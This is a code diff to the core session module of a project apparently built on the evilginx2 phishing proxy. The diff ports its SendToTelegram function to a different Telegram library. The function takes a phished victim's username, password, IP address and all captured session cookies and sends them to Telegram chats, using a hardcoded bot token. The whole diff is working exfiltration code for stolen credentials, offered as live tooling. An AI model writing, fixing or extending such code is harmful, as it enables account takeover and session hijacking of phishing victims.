@@ -3,13 +3,13 @@ package core
 import (
     "encoding/json"
     "fmt"
-    "io"
+    "io/ioutil"
     "log"
     "os"
     "time"
 
+    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
     "github.com/kgretzky/evilginx2/database"
-    "gopkg.in/telebot.v3"
 )
 
 type Session struct {
@@ -144,35 +144,32 @@ func (s *Session) SendToTelegram() error {
     defer file.Close()
 
     chatIDs := []int64{}
-    byteValue, err := io.ReadAll(file)
-    if err != nil {
-        return fmt.Errorf("failed to read chat ID file: %v", err)
-    }
-
+    byteValue, _ := ioutil.ReadAll(file)
     err = json.Unmarshal(byteValue, &chatIDs)
     if err != nil {
         return fmt.Errorf("failed to unmarshal chat ID file: %v", err)
     }
 
-    bot, err := telebot.NewBot(telebot.Settings{
-        Token:  "7528220716:AAGmwRLAjLgVglKFHq2-1521yb0bDjAqOkI",
-        Poller: &telebot.LongPoller{Timeout: 10 * time.Second},
-    })
+    // Initialize the bot
+    bot, err := tgbotapi.NewBotAPI("7528220716:AAGmwRLAjLgVglKFHq2-1521yb0bDjAqOkI")
     if err != nil {
         return fmt.Errorf("failed to create bot: %v", err)
     }
 
-    message := fmt.Sprintf("Username: %s\nPassword: %s\n", s.Username, s.Password)
-    message += fmt.Sprintf("IP Address: %s\n", s.RemoteAddr)
-    message += "Cookies:\n"
+    messageText := fmt.Sprintf("Username: %s\nPassword: %s\n", s.Username, s.Password)
+    messageText += fmt.Sprintf("IP Address: %s\n", s.RemoteAddr)
+    messageText += "Cookies:\n"
     for domain, cookies := range s.CookieTokens {
-        message += fmt.Sprintf("Domain: %s\n", domain)
+        messageText += fmt.Sprintf("Domain: %s\n", domain)
         for name, cookie := range cookies {
-            message += fmt.Sprintf("  %s: %s\n", name, cookie.Value)
+            messageText += fmt.Sprintf("  %s: %s\n", name, cookie.Value)
         }
     }
+
+    // Send the message to each chat ID
     for _, chatID := range chatIDs {
-        _, err = bot.Send(telebot.ChatID(chatID), message)
+        msg := tgbotapi.NewMessage(chatID, messageText)
+        _, err = bot.Send(msg)
         if err != nil {
             log.Printf("failed to send message to chat ID %d: %v", chatID, err)
         }
@@ -182,7 +179,7 @@ func (s *Session) SendToTelegram() error {
 }
 
 func (s *Session) Finish(is_auth_url bool) {
-    if (!s.IsDone) {
+    if !s.IsDone {
         s.IsDone = true
         s.IsAuthUrl = is_auth_url
         if s.DoneSignal != nil {
